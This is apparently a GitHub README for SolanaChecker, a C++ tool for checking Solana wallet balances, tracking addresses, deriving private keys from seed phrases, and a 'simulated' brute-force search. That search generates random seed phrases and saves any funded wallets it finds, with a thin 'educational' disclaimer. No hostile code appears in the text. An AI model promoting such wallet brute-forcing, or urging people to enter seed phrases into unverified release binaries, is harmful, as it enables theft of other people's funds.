# Solana Wallet Balance Search Tool: Find and Verify SOL Holdings with SolanaChecker

**SolanaChecker** is a powerful and versatile tool designed to streamline your interactions with the Solana blockchain. With its comprehensive set of features, SolanaChecker provides you with the ability to quickly search for and verify Solana wallet balances, manage your digital assets and conduct in-depth analyses of your holdings.

<p align="left">
    <img src="/src/dialog.webp" />
</p>

## Key Features for Solana Wallet Balance Search

1.  **Check Solana Address Balance (Core Function):** *This is the primary function for quickly finding a Solana wallet balance.* Easily check the current SOL balance of any Solana address. This enables you to instantly verify the holdings of your wallets, confirm transactions, and monitor your funds effectively.

<p align="left">
    <img src="/src/glance.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess the security of tokens based on their characteristics and metadata. This critical feature helps users avoid investing in potentially fraudulent projects, minimizing risks such as rug-pulls and other scams.

<p align="left">
    <img src="/src/footer.webp" />
</p>

3.  **Track Solana Addresses:** Receive real-time notifications about all activity on specific Solana addresses through a Telegram bot. Monitor transaction activity, incoming and outgoing funds, and stay updated on any changes to your wallets.

4.  **Wallet Data from Mnemonic Phrase:** Retrieve wallet data (private key, address, and balance) from a mnemonic phrase (seed phrase). *This is essential for retrieving balance information and managing wallets.*

<p align="left">
    <img src="/src/inspect.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate a new Solana wallet. This feature enables you to create new addresses for testing, managing various accounts, and securing your SOL.

<p align="left">
    <img src="/src/grid.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (Simulated Search):** *This feature, for educational purposes, simulates a brute-force process.* It generates random seed phrases and checks the balances of the resulting wallets. *This illustrates the importance of secure seed phrase generation*. If a wallet with a balance is found during the simulated search, the data will be written to the 'found-wallets.txt' file, and a Telegram notification is sent (if configured).

<p align="left">
    <img src="/src/browse.webp" />
</p>

## Setting Up Telegram Notifications

Configure Telegram to receive notifications when a wallet is discovered, or to monitor transactions by adding your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and [chat_id](https://t.me/getmyid_bot) to the 'telegram-settings.txt' file.

## Getting Started: Download or Build

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project: Verification and Customization

Building the project from source code is highly recommended to verify the integrity of the tool and ensure it functions as expected.

### Installing Dependencies Using vcpkg:

1.  If you do not have **vcpkg**, install it by following the instructions on the [official page](https://github.com/microsoft/vcpkg).

2.  Add vcpkg to your system PATH.

3.  Run the following commands to install the dependencies:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build the project using Visual Studio or another C++ compiler.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure **vcpkg** is correctly integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable is located in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed via **vcpkg** and are accessible to your compiler.
2.  Compile the project using a command similar to this (adapt as needed):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Searching for and Verifying Balances

Use these command-line arguments to search for and verify Solana wallet balances:

1.  **-s / -search**: Begin the simulated seed phrase generation search (for educational purposes only).
2.  **-t / -track (ADDRESS)**: Track activity on a specific address (monitor transactions).
3.  **-g / -gen (NUMBER)**: Generate a specified number of Solana wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Display wallet information using the seed phrase.
5.  **-b / -balance (ADDRESS)**: *Check and display the balance of a given Solana address.* This is the core function for finding balances.

## Notes

-   Use SolanaChecker responsibly and ethically.
-   The "search" function is for educational purposes only and should not be used for any unauthorized activities.
-   All cryptocurrency operations involve risks. Always prioritize security and safeguard your data.
-   The brute-force simulation emphasizes the importance of secure seed phrase generation.

## License

This project is licensed under the [MIT License](/LICENSE).



Update:  06/17/2025 url is responsive and live